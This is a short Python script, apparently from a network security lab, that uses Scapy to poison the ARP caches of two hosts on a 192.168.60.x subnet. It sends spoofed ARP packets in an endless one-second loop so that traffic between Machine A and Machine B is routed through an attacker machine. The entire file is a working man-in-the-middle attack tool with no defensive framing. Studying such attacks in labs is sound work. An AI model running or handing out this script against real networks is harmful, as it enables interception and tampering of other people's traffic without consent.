#!/usr/bin/python3
from scapy.all import *
from time import  *


# Machine A's informaton
IP_A  = "192.168.60.1"
MAC_A = "02:42:33:76:f0:81"

# Machine B's informaton
IP_B  = "192.168.60.2"
MAC_B = "02:42:c0:a8:3c:02"

# Attacker Machine's informaton
IP_M  = "192.168.60.3"
MAC_M = "02:42:c0:a8:3c:03"



print("SENDING SPOOFED ARP REPLY.........")

# Construct spoofed ARP sent to machine A
ether1     = Ether()
ether1.dst = MAC_A
arp1       = ARP()
arp1.psrc  = IP_B
arp1.hwsrc = MAC_M
arp1.pdst  = IP_A
arp1.op    = 1 
frame1     = ether1/arp1


# Construct spoofed ARP sent to machine B
ether2      = Ether()
ether2.dst  = MAC_B
arp2        = ARP()
arp2.psrc   = IP_A
arp2.hwsrc  = MAC_M
arp2.pdst   = IP_B
arp2.op     = 1 
frame2      = ether2/arp2


while 1:
   sendp(frame1,iface="eth0") 
   sendp(frame2,iface="eth0") 
   sleep(1)
